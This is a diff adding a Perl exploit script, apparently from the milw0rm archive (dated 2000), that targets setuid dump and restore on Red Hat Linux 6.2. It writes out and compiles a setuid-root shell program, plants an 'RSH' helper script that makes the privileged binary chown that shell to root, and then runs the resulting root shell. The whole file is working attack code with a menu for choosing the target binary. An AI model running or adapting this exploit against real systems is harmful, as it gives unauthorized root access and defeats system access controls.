@@ -1,0 +1,144 @@
+#!/usr/bin/perl
+
+# perl exploit of restore and dump
+# redhat linux 6.2
+# written by tlabs
+# Use at your discretion
+
+$EXPORT1="TAPE=garbage:garbage" ;
+$EXPORT2="RSH=./hey" ;
+
+sub USAGE
+{
+  print "$0 <type>\n1=dump 2=dump.static 3=restore 4=restore.staic\nYour choice innit;)\nWritten by Tlabs\n" ;
+  exit 0 ;
+}
+
+sub ERROR
+{
+  print "$_[0]\n" ;
+  exit 0 ;
+}
+
+open(TEMP, ">shell.c")|| ERROR("Something went wrong:$!");
+printf TEMP "#include<unistd.h>\n#include<stdlib.h>\nint main()\n{" ;
+printf TEMP "    setuid(0);\n\tsetgid(0);\n\texecl(\"/bin/sh\",\"sh\",0);\n\treturn 0;\n}" ;
+close(TEMP);
+system "cc -o shell shell.c" ;
+unlink "shell.c" ;
+open(TEMP1, ">hey")|| ERROR("Something went wrong: $!");
+printf TEMP1 "#!/bin/sh\nchown root shell\nchmod 4755 shell" ;
+close(TEMP1);
+chmod(0755, "hey");
+
+if ($ARGV[$0] eq "1")
+{
+  $DUMPER="/sbin/dump" ;
+  if ( -u "$DUMPER" )
+  {
+    system "export $EXPORT1 ;export $EXPORT2 ; $DUMPER -0 \/" ;
+    sleep(3);
+    if ( -u "shell" )
+    {
+      unlink "hey" ;
+      system "./shell" ;
+    }
+    else
+    {
+      unlink "hey" ;
+      unlink "shell" ;
+      print "Something fucked at the last, sorry" ;
+    }
+   }
+   else
+   {
+     unlink "hey" ;
+     unlink "shell" ;
+     printf "Dump is not exploitable on this system\n";
+   }
+}
+elsif ($ARGV[$0] eq "2")
+{
+  $DUMPER="/sbin/dump.static" ;
+  if ( -u "$DUMPER" )
+  {
+    system "export $EXPORT1 ;export $EXPORT2 ; $DUMPER -0 \/" ;
+    sleep(3);
+    if ( -u "shell" )
+    {
+      unlink "hey" ;
+      system "./shell" ;
+    }
+    else
+    {
+      unlink "hey" ;
+      unlink "shell" ;
+      print "Something fucked at the last, sorry" ;
+    }
+  }
+  else
+  {
+    unlink "hey" ;
+    unlink "shell" ;
+    printf "Dump.static is not exploitable on this system\n";
+  }
+}
+elsif ($ARGV[$0] eq "3")
+{
+  $RESTORER="/sbin/restore" ;
+  if ( -u "$RESTORER" )
+  {
+    system "export $EXPORT1 ; export $EXPORT2 ; $RESTORER -i" ;
+    sleep(3);
+    if ( -u "shell" )
+    {
+      unlink "hey" ;
+      system "./shell" ;
+    }
+    else
+    {
+      unlink "hey" ;
+      unlink "shell" ;
+      print "Something fucked at the last, sorry" ;
+    }
+  }
+  else
+  {
+    unlink "hey" ;
+    unlink "shell" ;
+    printf "Restore is not exploitable on this system\n";
+  }
+}
+elsif ($ARGV[$0] eq "4")
+{
+  $RESTORER="/sbin/restore.static" ;
+  if ( -u "$RESTORER" )
+  {
+    system "export $EXPORT1 ; export $EXPORT2 ; $RESTORER -i" ;
+    sleep(3);
+    if ( -u "shell" )
+    {
+      unlink "hey" ;
+      system "./shell" ;
+    }
+    else
+    {
+      unlink "hey" ;
+      unlink "shell" ;
+      print "Something fucked at the last, sorry" ;
+    }
+  }
+  else
+  {
+    unlink "hey" ;
+    unlink "shell" ;
+    printf "Restore.static is not exploitable on this system\n";
+  }
+}
+else
+{
+  USAGE ;
+}
+
+
+# milw0rm.com [2000-11-16]
